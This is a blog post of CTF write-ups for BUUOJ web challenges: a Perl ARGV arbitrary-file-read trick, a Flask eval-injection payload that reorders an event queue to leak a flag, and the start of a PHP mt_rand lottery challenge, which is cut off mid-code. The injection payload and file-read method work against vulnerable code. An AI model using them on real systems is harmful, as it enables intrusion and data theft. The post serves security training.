itemprop="articleBody"><div class="post-content markdown-body"><p>by:gyy</p>
<p>刷题，buuoj记录</p>
<span id="more"></span>

<hr>
<h2 id="CSAWQual-2016-i-got-id"><a href="#CSAWQual-2016-i-got-id" class="headerlink" title="[CSAWQual 2016]i_got_id"></a>[CSAWQual 2016]i_got_id</h2><img src="/article/Buuoj-WEB-Write-up/image-20201129165730787.png" class="" title="image-20201129165730787" loading="lazy">

<p>咱也不懂perl…</p>
<p>发现了文件上传的地方</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129165825648.png" class="" title="image-20201129165825648" loading="lazy">

<p>发现会把上传的文件直接显示在网页上</p>
<p>查了下原理</p>
<h5 id="perlparam-任意文件读取"><a href="#perlparam-任意文件读取" class="headerlink" title="perlparam()任意文件读取"></a>perlparam()任意文件读取</h5><pre class="language-php" data-language="php"><code class="language-php">
<span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token variable">$cgi</span><span class="token operator">-></span><span class="token function">upload</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
    <span class="token class-name type-declaration">my</span> <span class="token variable">$file</span> <span class="token operator">=</span> <span class="token variable">$cgi</span><span class="token operator">-></span><span class="token function">param</span><span class="token punctuation">(</span><span class="token string single-quoted-string">'file'</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token keyword">while</span> <span class="token punctuation">(</span><span class="token operator">&lt;</span><span class="token variable">$file</span><span class="token operator">></span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>
        <span class="token keyword">print</span> <span class="token string double-quoted-string">"<span class="token interpolation"><span class="token variable">$_</span></span>"</span><span class="token punctuation">;</span>
        <span class="token keyword">print</span> <span class="token string double-quoted-string">"&lt;br />"</span><span class="token punctuation">;</span>
    <span class="token punctuation">&#125;</span>
<span class="token punctuation">&#125;</span></code></pre>

<p> 如上代码将上传的文件原样输出到网页 </p>
<p>知识点： param()函数会返回一个列表的文件但是只有第一个文件会被放入到下面的file变量中。而对于下面的读文件逻辑来说，如果我们传入一个ARGV的文件，那么Perl会将传入的参数作为文件名读出来。这样，我们的利用方法就出现了：在正常的上传文件前面加上一个文件上传项ARGV，然后在URL中传入文件路径参数，这样就可以读取任意文件了。 </p>
<p>ARGV——命令行参数</p>
<p>于是抓包</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129170225902.png" class="" title="image-20201129170225902" loading="lazy">

<p>修改为：</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129170548925.png" class="" title="image-20201129170548925" loading="lazy">



<hr>
<h2 id="DDCTF-2019-homebrew-event-loop"><a href="#DDCTF-2019-homebrew-event-loop" class="headerlink" title="[DDCTF 2019]homebrew event loop"></a>[DDCTF 2019]homebrew event loop</h2><img src="/article/Buuoj-WEB-Write-up/image-20201129170732360.png" class="" title="image-20201129170732360" loading="lazy">

<p>source code</p>
<pre class="language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> session<span class="token punctuation">,</span> request<span class="token punctuation">,</span> Response
<span class="token keyword">import</span> urllib

app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>
app<span class="token punctuation">.</span>secret_key <span class="token operator">=</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span>
url_prefix <span class="token operator">=</span> <span class="token string">'/d5afe1f66147e857'</span>


<span class="token keyword">def</span> <span class="token function">FLAG</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">return</span> <span class="token string">'*********************'</span>  <span class="token comment"># censored</span>


<span class="token keyword">def</span> <span class="token function">trigger_event</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span><span class="token punctuation">:</span>
    session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span>
    <span class="token keyword">if</span> <span class="token builtin">len</span><span class="token punctuation">(</span>session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">5</span><span class="token punctuation">:</span>
        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span><span class="token punctuation">[</span><span class="token operator">-</span><span class="token number">5</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> <span class="token builtin">type</span><span class="token punctuation">(</span>event<span class="token punctuation">)</span> <span class="token operator">==</span> <span class="token builtin">type</span><span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
        request<span class="token punctuation">.</span>event_queue <span class="token operator">+=</span> event
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        request<span class="token punctuation">.</span>event_queue<span class="token punctuation">.</span>append<span class="token punctuation">(</span>event<span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">get_mid_str</span><span class="token punctuation">(</span>haystack<span class="token punctuation">,</span> prefix<span class="token punctuation">,</span> postfix<span class="token operator">=</span><span class="token boolean">None</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token operator">+</span><span class="token builtin">len</span><span class="token punctuation">(</span>prefix<span class="token punctuation">)</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> postfix <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
        haystack <span class="token operator">=</span> haystack<span class="token punctuation">[</span><span class="token punctuation">:</span>haystack<span class="token punctuation">.</span>find<span class="token punctuation">(</span>postfix<span class="token punctuation">)</span><span class="token punctuation">]</span>
    <span class="token keyword">return</span> haystack


<span class="token keyword">class</span> <span class="token class-name">RollBackException</span><span class="token punctuation">:</span>
    <span class="token keyword">pass</span>


<span class="token keyword">def</span> <span class="token function">execute_event_loop</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    valid_event_chars <span class="token operator">=</span> <span class="token builtin">set</span><span class="token punctuation">(</span>
        <span class="token string">'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ_0123456789:;#'</span><span class="token punctuation">)</span>
    resp <span class="token operator">=</span> <span class="token boolean">None</span>
    <span class="token keyword">while</span> <span class="token builtin">len</span><span class="token punctuation">(</span>request<span class="token punctuation">.</span>event_queue<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token comment"># `event` is something like "action:ACTION;ARGS0#ARGS1#ARGS2......"</span>
        event <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
        request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> request<span class="token punctuation">.</span>event_queue<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">:</span><span class="token punctuation">]</span>
        <span class="token keyword">if</span> <span class="token keyword">not</span> event<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">,</span> <span class="token string">'func:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
            <span class="token keyword">continue</span>
        <span class="token keyword">for</span> c <span class="token keyword">in</span> event<span class="token punctuation">:</span>
            <span class="token keyword">if</span> c <span class="token keyword">not</span> <span class="token keyword">in</span> valid_event_chars<span class="token punctuation">:</span>
                <span class="token keyword">break</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            is_action <span class="token operator">=</span> event<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">==</span> <span class="token string">'a'</span>
            action <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> <span class="token string">':'</span><span class="token punctuation">,</span> <span class="token string">';'</span><span class="token punctuation">)</span>
            args <span class="token operator">=</span> get_mid_str<span class="token punctuation">(</span>event<span class="token punctuation">,</span> action<span class="token operator">+</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>split<span class="token punctuation">(</span><span class="token string">'#'</span><span class="token punctuation">)</span>
            <span class="token keyword">try</span><span class="token punctuation">:</span>
                event_handler <span class="token operator">=</span> <span class="token builtin">eval</span><span class="token punctuation">(</span>
                    action <span class="token operator">+</span> <span class="token punctuation">(</span><span class="token string">'_handler'</span> <span class="token keyword">if</span> is_action <span class="token keyword">else</span> <span class="token string">'_function'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
                ret_val <span class="token operator">=</span> event_handler<span class="token punctuation">(</span>args<span class="token punctuation">)</span>
            <span class="token keyword">except</span> RollBackException<span class="token punctuation">:</span>
                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                    resp <span class="token operator">=</span> <span class="token string">''</span>
                resp <span class="token operator">+=</span> <span class="token string">'ERROR! All transactions have been cancelled. &lt;br />'</span>
                resp <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>
                session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>
                session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> request<span class="token punctuation">.</span>prev_session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span>
                <span class="token keyword">break</span>
            <span class="token keyword">except</span> Exception<span class="token punctuation">,</span> e<span class="token punctuation">:</span>
                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                    resp <span class="token operator">=</span> <span class="token string">''</span>
                <span class="token comment"># resp += str(e) # only for debugging</span>
                <span class="token keyword">continue</span>
            <span class="token keyword">if</span> ret_val <span class="token keyword">is</span> <span class="token keyword">not</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span><span class="token punctuation">:</span>
                    resp <span class="token operator">=</span> ret_val
                <span class="token keyword">else</span><span class="token punctuation">:</span>
                    resp <span class="token operator">+=</span> ret_val
    <span class="token keyword">if</span> resp <span class="token keyword">is</span> <span class="token boolean">None</span> <span class="token keyword">or</span> resp <span class="token operator">==</span> <span class="token string">''</span><span class="token punctuation">:</span>
        resp <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token string">'404 NOT FOUND'</span><span class="token punctuation">,</span> <span class="token number">404</span><span class="token punctuation">)</span>
    session<span class="token punctuation">.</span>modified <span class="token operator">=</span> <span class="token boolean">True</span>
    <span class="token keyword">return</span> resp


<span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span>url_prefix<span class="token operator">+</span><span class="token string">'/'</span><span class="token punctuation">)</span>
<span class="token keyword">def</span> <span class="token function">entry_point</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>
    querystring <span class="token operator">=</span> urllib<span class="token punctuation">.</span>unquote<span class="token punctuation">(</span>request<span class="token punctuation">.</span>query_string<span class="token punctuation">)</span>
    request<span class="token punctuation">.</span>event_queue <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    <span class="token keyword">if</span> querystring <span class="token operator">==</span> <span class="token string">''</span> <span class="token keyword">or</span> <span class="token punctuation">(</span><span class="token keyword">not</span> querystring<span class="token punctuation">.</span>startswith<span class="token punctuation">(</span><span class="token string">'action:'</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token keyword">or</span> <span class="token builtin">len</span><span class="token punctuation">(</span>querystring<span class="token punctuation">)</span> <span class="token operator">></span> <span class="token number">100</span><span class="token punctuation">:</span>
        querystring <span class="token operator">=</span> <span class="token string">'action:index;False#False'</span>
    <span class="token keyword">if</span> <span class="token string">'num_items'</span> <span class="token keyword">not</span> <span class="token keyword">in</span> session<span class="token punctuation">:</span>
        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">0</span>
        session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">3</span>
        session<span class="token punctuation">[</span><span class="token string">'log'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token punctuation">[</span><span class="token punctuation">]</span>
    request<span class="token punctuation">.</span>prev_session <span class="token operator">=</span> <span class="token builtin">dict</span><span class="token punctuation">(</span>session<span class="token punctuation">)</span>
    trigger_event<span class="token punctuation">(</span>querystring<span class="token punctuation">)</span>
    <span class="token keyword">return</span> execute_event_loop<span class="token punctuation">(</span><span class="token punctuation">)</span>

<span class="token comment"># handlers/functions below --------------------------------------</span>


<span class="token keyword">def</span> <span class="token function">view_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    page <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    html <span class="token operator">=</span> <span class="token string">''</span>
    html <span class="token operator">+=</span> <span class="token string">'[INFO] you have &#123;&#125; diamonds, &#123;&#125; points now.&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
        session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span><span class="token punctuation">,</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> page <span class="token operator">==</span> <span class="token string">'index'</span><span class="token punctuation">:</span>
        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23False">View source code&lt;/a>&lt;br />'</span>
        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;shop">Go to e-shop&lt;/a>&lt;br />'</span>
        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;reset">Reset&lt;/a>&lt;br />'</span>
    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'shop'</span><span class="token punctuation">:</span>
        html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:buy;1">Buy a diamond (1 point)&lt;/a>&lt;br />'</span>
    <span class="token keyword">elif</span> page <span class="token operator">==</span> <span class="token string">'reset'</span><span class="token punctuation">:</span>
        <span class="token keyword">del</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span>
        html <span class="token operator">+=</span> <span class="token string">'Session reset.&lt;br />'</span>
    html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>
    <span class="token keyword">return</span> html


<span class="token keyword">def</span> <span class="token function">index_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    bool_show_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    bool_download_source <span class="token operator">=</span> <span class="token builtin">str</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> bool_show_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>

        source <span class="token operator">=</span> <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'eventLoop.py'</span><span class="token punctuation">,</span> <span class="token string">'r'</span><span class="token punctuation">)</span>
        html <span class="token operator">=</span> <span class="token string">''</span>
        <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>
            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:index;True%23True">Download this .py file&lt;/a>&lt;br />'</span>
            html <span class="token operator">+=</span> <span class="token string">'&lt;a href="./?action:view;index">Go back to index.html&lt;/a>&lt;br />'</span>

        <span class="token keyword">for</span> line <span class="token keyword">in</span> source<span class="token punctuation">:</span>
            <span class="token keyword">if</span> bool_download_source <span class="token operator">!=</span> <span class="token string">'True'</span><span class="token punctuation">:</span>
                html <span class="token operator">+=</span> line<span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&amp;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;amp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\t'</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token operator">*</span><span class="token number">4</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span>
                    <span class="token string">' '</span><span class="token punctuation">,</span> <span class="token string">'&amp;nbsp;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'&lt;'</span><span class="token punctuation">,</span> <span class="token string">'&amp;lt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'>'</span><span class="token punctuation">,</span> <span class="token string">'&amp;gt;'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>replace<span class="token punctuation">(</span><span class="token string">'\n'</span><span class="token punctuation">,</span> <span class="token string">'&lt;br />'</span><span class="token punctuation">)</span>
            <span class="token keyword">else</span><span class="token punctuation">:</span>
                html <span class="token operator">+=</span> line
        source<span class="token punctuation">.</span>close<span class="token punctuation">(</span><span class="token punctuation">)</span>

        <span class="token keyword">if</span> bool_download_source <span class="token operator">==</span> <span class="token string">'True'</span><span class="token punctuation">:</span>
            headers <span class="token operator">=</span> <span class="token punctuation">&#123;</span><span class="token punctuation">&#125;</span>
            headers<span class="token punctuation">[</span><span class="token string">'Content-Type'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'text/plain'</span>
            headers<span class="token punctuation">[</span><span class="token string">'Content-Disposition'</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token string">'attachment; filename=serve.py'</span>
            <span class="token keyword">return</span> Response<span class="token punctuation">(</span>html<span class="token punctuation">,</span> headers<span class="token operator">=</span>headers<span class="token punctuation">)</span>
        <span class="token keyword">else</span><span class="token punctuation">:</span>
            <span class="token keyword">return</span> html
    <span class="token keyword">else</span><span class="token punctuation">:</span>
        trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">buy_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    num_items <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> num_items <span class="token operator">&lt;=</span> <span class="token number">0</span><span class="token punctuation">:</span>
        <span class="token keyword">return</span> <span class="token string">'invalid number(&#123;&#125;) of diamonds to buy&lt;br />'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">+=</span> num_items
    trigger_event<span class="token punctuation">(</span><span class="token punctuation">[</span><span class="token string">'func:consume_point;&#123;&#125;'</span><span class="token punctuation">.</span><span class="token builtin">format</span><span class="token punctuation">(</span>
        num_items<span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token string">'action:view;index'</span><span class="token punctuation">]</span><span class="token punctuation">)</span>


<span class="token keyword">def</span> <span class="token function">consume_point_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    point_to_consume <span class="token operator">=</span> <span class="token builtin">int</span><span class="token punctuation">(</span>args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span><span class="token punctuation">)</span>
    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">&lt;</span> point_to_consume<span class="token punctuation">:</span>
        <span class="token keyword">raise</span> RollBackException<span class="token punctuation">(</span><span class="token punctuation">)</span>
    session<span class="token punctuation">[</span><span class="token string">'points'</span><span class="token punctuation">]</span> <span class="token operator">-=</span> point_to_consume


<span class="token keyword">def</span> <span class="token function">show_flag_function</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag <span class="token operator">=</span> args<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span>
    <span class="token comment"># return flag # GOTCHA! We noticed that here is a backdoor planted by a hacker which will print the flag, so we disabled it.</span>
    <span class="token keyword">return</span> <span class="token string">'You naughty boy! ;) &lt;br />'</span>


<span class="token keyword">def</span> <span class="token function">get_flag_handler</span><span class="token punctuation">(</span>args<span class="token punctuation">)</span><span class="token punctuation">:</span>
    <span class="token keyword">if</span> session<span class="token punctuation">[</span><span class="token string">'num_items'</span><span class="token punctuation">]</span> <span class="token operator">>=</span> <span class="token number">5</span><span class="token punctuation">:</span>
        <span class="token comment"># show_flag_function has been disabled, no worries</span>
        trigger_event<span class="token punctuation">(</span><span class="token string">'func:show_flag;'</span> <span class="token operator">+</span> FLAG<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>
    trigger_event<span class="token punctuation">(</span><span class="token string">'action:view;index'</span><span class="token punctuation">)</span>


<span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">'__main__'</span><span class="token punctuation">:</span>
    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>debug<span class="token operator">=</span><span class="token boolean">False</span><span class="token punctuation">,</span> host<span class="token operator">=</span><span class="token string">'0.0.0.0'</span><span class="token punctuation">)</span>
</code></pre>

<p>题目中有flask，网站内容和购买有关，盲猜flask session逻辑漏洞</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129174627993.png" class="" title="image-20201129174627993" loading="lazy">

<p>拿去<code>flask_session_cookie_manager</code>解密</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129174747409.png" class="" title="image-20201129174747409" loading="lazy">

<p><code>&#123;&quot;log&quot;:[&#123;&quot; b&quot;:&quot;YWN0aW9uOnZpZXc7aW5kZXg=&quot;&#125;,&#123;&quot; b&quot;:&quot;YWN0aW9uOnZpZXc7aW5kZXg=&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;</code></p>
<p>base64再解密得</p>
<p><code>&#123;&quot;log&quot;:[&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;,&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;</code></p>
<p>分析serve.py</p>
<p>先找flag</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129175323407.png" class="" title="image-20201129175323407" loading="lazy">

<p>发现在get_flag_handler函数里，而条件是<code>session[&#39;num_items&#39;] &gt;= 5</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129175427470.png" class="" title="image-20201129175427470" loading="lazy">

<p>再跳到buy_handler函数里</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129175938047.png" class="" title="image-20201129175938047" loading="lazy">

<p>关键逻辑</p>
<p><strong>num_items数目先增，然后再扣point，如果point不够再把num_items扣回去</strong></p>
<p>然后就不会了</p>
<p>开始分析大佬的WP</p>
<ul>
<li><p>仔细分析execute_event_loop，会发现里面有一个eval函数，而且是可控的！ </p>
</li>
<li><p>利用eval()可以导致任意命令执行，使用注释符可以 bypass 掉后面的拼接部分。 </p>
</li>
<li><p>若让eval()去执行trigger_event()，并且在后面跟两个命令作为参数，分别是buy和get_flag，那么buy和get_flag便先后进入队列。 </p>
</li>
<li><p>根据顺序会先执行buy_handler()，此时consume_point进入队列，排在get_flag之后，我们的目标达成。</p>
</li>
</ul>
<p>最终payload：</p>
<pre class="language-none"><code class="language-none">action:trigger_event%23;action:buy;5%23action:get_flag;</code></pre>

<p>不知道编码问题？<code>#</code>必须写成 <code>%23</code></p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129181046007.png" class="" title="image-20201129181046007" loading="lazy">

<p>拿去解密得</p>
<img src="/article/Buuoj-WEB-Write-up/image-20201129181142945.png" class="" title="image-20201129181142945" loading="lazy">

<p>base64解密得</p>
<pre class="language-none"><code class="language-none">&#123;&quot;log&quot;:[&#123;&quot; b&quot;:&quot;action:trigger_event#;action:buy;5#action:get_flag;&quot;&#125;,[&#123;&quot; b&quot;:&quot;action:buy;5&quot;&#125;,&#123;&quot; b&quot;:&quot;action:get_flag;&quot;&#125;],[&#123;&quot; b&quot;:&quot;func:consume_point;5&quot;&#125;,&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;],&#123;&quot; b&quot;:&quot;func:show_flag;flag&#123;f0c04d65-ffa9-472b-9263-1e308ad45fd8&#125;&quot;&#125;,&#123;&quot; b&quot;:&quot;action:view;index&quot;&#125;],&quot;num_items&quot;:0,&quot;points&quot;:3&#125;&#96;</code></pre>

<p>flag即在其中</p>
<hr>
<h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><img src="/article/Buuoj-WEB-Write-up/image-20201129181539620.png" class="" title="image-20201129181539620" loading="lazy">

<p>看源码有个hidden标签，直接去掉得到源码</p>
<pre class="language-php" data-language="php"><code class="language-php"><span class="token php language-php"><span class="token delimiter important">&lt;?php</span>
<span class="token comment">#这不是抽奖程序的源代码！不许看！</span>
<span class="token function">header</span><span class="token punctuation">(</span><span class="token string double-quoted-string">"Content-Type: text/html;charset=utf-8"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token function">session_start</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token operator">!</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
<span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token operator">=</span><span class="token function">rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span><span class="token number">999999999</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token punctuation">&#125;</span>

<span class="token function">mt_srand</span><span class="token punctuation">(</span><span class="token variable">$_SESSION</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'seed'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token variable">$str_long1</span> <span class="token operator">=</span> <span class="token string double-quoted-string">"abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ"</span><span class="token punctuation">;</span>
<span class="token variable">$str</span><span class="token operator">=</span><span class="token string single-quoted-string">''</span><span class="token punctuation">;</span>
<span class="token variable">$len1</span><span class="token operator">=</span><span class="token number">20</span><span class="token punctuation">;</span>
<span class="token keyword">for</span> <span class="token punctuation">(</span> <span class="token variable">$i</span> <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> <span class="token variable">$i</span> <span class="token operator">&lt;</span> <span class="token variable">$len1</span><span class="token punctuation">;</span> <span class="token variable">$i</span><span class="token operator">++</span> <span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
    <span class="token variable">$str</span><span class="token operator">.=</span><span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">,</span> <span class="token function">mt_rand</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">,</span> <span class="token function">strlen</span><span class="token punctuation">(</span><span class="token variable">$str_long1</span><span class="token punctuation">)</span> <span class="token operator">-</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token number">1</span><span class="token punctuation">)</span><span class="token punctuation">;</span>       
<span class="token punctuation">&#125;</span>
<span class="token variable">$str_show</span> <span class="token operator">=</span> <span class="token function">substr</span><span class="token punctuation">(</span><span class="token variable">$str</span><span class="token punctuation">,</span> <span class="token number">0</span><span class="token punctuation">,</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
<span class="token keyword">echo</span> <span class="token string double-quoted-string">"&lt;p id='p1'>"</span><span class="token operator">.</span><span class="token variable">$str_show</span><span class="token operator">.</span><span class="token string double-quoted-string">"&lt;/p>"</span><span class="token punctuation">;</span>


<span class="token keyword">if</span><span class="token punctuation">(</span><span class="token keyword">isset</span><span class="token punctuation">(</span><span class="token variable">$_POST</span><span class="token punctuation">[</span><span class="token string single-quoted-string">'num'</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">&#123;</span>
